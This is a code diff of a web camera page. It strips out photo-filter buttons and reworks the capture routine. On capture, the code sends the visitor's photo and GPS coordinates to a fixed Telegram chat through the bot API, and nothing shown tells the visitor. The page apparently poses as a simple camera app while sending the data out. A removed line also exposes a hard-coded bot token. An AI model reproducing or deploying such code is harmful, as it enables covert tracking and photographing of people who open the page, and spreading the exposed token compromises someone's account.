@@ -61,57 +61,23 @@
 
     /* Buttons Container */
     #controls {
-      position: fixed;
-      bottom: 20px;
+      position: absolute;
+      bottom: 10px;
       left: 50%;
       transform: translateX(-50%);
       display: flex;
-      flex-direction: column;
+      flex-direction: row;
+      justify-content: center;
       align-items: center;
       z-index: 20;
+      width: 100%;
+      gap: 10px;
     }
 
-    /* Filter Buttons */
-    .filter-buttons {
-      display: flex;
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-
-    .filter-button {
-      width: 50px;
-      height: 50px;
-      background-color: rgba(255, 255, 255, 0.3);
-      border: 2px solid white;
-      border-radius: 50%;
-      cursor: pointer;
-      transition: transform 0.2s ease, background-color 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px; /* Reduced font size */
-      color: white;
-    }
-
-    .filter-button:hover {
-      transform: scale(1.2);
-      background-color: rgba(255, 255, 255, 0.5);
-    }
-
-    .filter-button.active {
-      background-color: rgba(255, 255, 255, 1);
-    }
-
-    /* Action Buttons */
-    #action-buttons {
-      display: flex;
-      gap: 15px;
-      margin-top: 15px;
-    }
-
+    /* Buttons */
     .button {
-      width: 50px;
-      height: 50px;
+      width: 60px;
+      height: 60px;
       background-color: rgba(255, 255, 255, 0.3);
       border: 2px solid white;
       border-radius: 50%;
@@ -128,10 +94,6 @@
       transform: scale(1.2);
       background-color: rgba(255, 255, 255, 0.5);
     }
-
-    .button.active {
-      background-color: rgba(255, 255, 255, 1);
-    }
   </style>
 </head>
 <body>
@@ -147,63 +109,19 @@
 
     <!-- Controls -->
     <div id="controls">
-      <!-- Filter Buttons -->
-      <div class="filter-buttons">
-        <!-- أزرار الفلاتر مع اختصار الأسماء -->
-        <button class="filter-button" data-filter="grayscale">GS</button>
-        <button class="filter-button" data-filter="sepia">S</button>
-        <button class="filter-button" data-filter="invert">I</button>
-        <button class="filter-button" data-filter="blur">B</button>
-        <button class="filter-button" data-filter="none">N</button>
-      </div>
-
-      <!-- Action Buttons -->
-      <div id="action-buttons">
-        <div id="capture" class="button">📸</div>
-        <div id="toggle-camera" class="button">🔄</div>
-      </div>
+      <div id="capture" class="button">📸</div>
+      <div id="toggle-camera" class="button">🔄</div>
     </div>
   </div>
 
 <script>
   const video = document.getElementById('camera');
-  const filterButtons = document.querySelectorAll('[data-filter]');
   const captureButton = document.getElementById('capture');
   const toggleCameraButton = document.getElementById('toggle-camera');
 
   let currentStream = null;
   let usingFrontCamera = true;
-  let gpsLocation = null; // لتخزين موقع GPS
-
-  // Apply selected filter
-  filterButtons.forEach(button => {
-    button.addEventListener('click', () => {
-      const filter = button.dataset.filter;
-
-      // Apply the selected filter to the video
-      video.style.filter = getFilter(filter);
-
-      // Update active button
-      filterButtons.forEach(btn => btn.classList.remove('active'));
-      button.classList.add('active');
-    });
-  });
-
-  // Map filter names to CSS filter values
-  function getFilter(name) {
-    switch (name) {
-      case 'grayscale':
-        return 'grayscale(100%)';
-      case 'sepia':
-        return 'sepia(100%)';
-      case 'invert':
-        return 'invert(100%)';
-      case 'blur':
-        return 'blur(5px)';
-      default:
-        return 'none';
-    }
-  }
+  let gpsLocation = null;
 
   // Start camera
   async function startCamera(front = true) {
@@ -291,26 +209,28 @@
     formData.append('chat_id', '1676411287'); // Replace with your chat ID
     formData.append('photo', imageBlob, 'photo.png');
 
-    // إضافة معلومات الموقع في نص الرسالة
-    let locationText = '';
+    // Add GPS location as a caption
+    let captionText = '';
     if (gpsLocation) {
-      locationText = `Location: Latitude ${gpsLocation.latitude}, Longitude ${gpsLocation.longitude}`;
+      captionText = `🌍 Location:\nLatitude: ${gpsLocation.latitude}\nLongitude: ${gpsLocation.longitude}`;
     } else {
-      locationText = 'Location information not available.';
+      captionText = '🌍 Location information not available.';
     }
 
-    // إرسال الصورة والموقع
-    fetch('https://api.telegram.org/bot5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI/sendPhoto', {
+    formData.append('caption', captionText);
+
+    // Send the image and location to Telegram
+    fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendPhoto', {
       method: 'POST',
-      body: formData
+      body: formData,
     })
-    .then(response => response.json())
-    .then(data => {
-      console.log('Telegram response:', data);
-    })
-    .catch(error => {
-      console.error('Error sending image to Telegram:', error);
-    });
+      .then(response => response.json())
+      .then(data => {
+        console.log('Telegram response:', data);
+      })
+      .catch(error => {
+        console.error('Error sending image to Telegram:', error);
+      });
   }
 
   // Start with the front camera
